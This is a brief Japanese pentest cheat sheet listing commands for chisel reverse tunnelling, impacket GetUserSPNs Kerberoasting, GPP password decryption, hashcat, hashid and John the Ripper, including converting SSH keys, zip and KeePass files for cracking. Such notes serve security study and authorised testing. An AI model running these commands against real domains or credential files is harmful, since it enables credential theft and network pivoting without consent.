# chisel
ネットワークトンネリングツールであり、リモートポートフォワーディングやリバーストンネリングを実現するために使用されるオープンソースのツール。
## Command
サーバー側の3306にアクセスすると、Chiselトンネルを通じてクライアント側の3306にアクセスする。
```bash
# サーバー側
./chisel server -p 8888 -reverse
# クライアント側
./chisel client <Server IP>:8888 R:3306:127.0.0.1:3306 &
```

# GetUserSPNs
サービスアカウントのパスワードハッシュを、ドメイン全体から抜き出すためのツール。
## Kerberoasting
```
sudo ntpdate <Target> # 時刻同期
impacket-GetUserSPNs -dc-ip <Target> <Domain>/<User>:<Password> -request -outputfile <File> -save 
```

# gpp-decrypt
GPPに含まれるcpasswordを復号するためのツール。
```bash
gpp-decrypt <cpassword>
```

# hashcat
パスワードハッシュを高速に解析・復元するオープンソースツール。
```bash
hashcat -m 3200 <File> <Wordlist> # bcrypt
hashcat -a 0 -m 5200 <File> <Wordlist> # psafe3
hashcat -a 0 -m 18200 <File> <Wordlist>
```

# hashid
入力されたハッシュ値が、どのアルゴリズムで生成されたものかを特定するためのツール。
```bash
hashid '<ハッシュ>'
```

# John The Ripper
主にパスワードクラッキングに使用される、無料でオープンソースのソフトウェアツール。
## Command
```bash
john <File> -w=<Wordlist> # 基本
--format=<Format> # フォーマット
 raw-md5 # md5ハッシュ
 md5crypt # $1$から始まるmd5
--fork=4 # 4スレッドで実行
```
## Conversion
```bash
ssh2john <ssh_key> > <output> # ssh2ファイルをハッシュに変換
zip2john <Zip> > <ouput> # ロックされているzipファイルをハッシュに変換
keepass2john <keepass> > <output> # ロックされているkeepassファイルをハッシュに変換
```






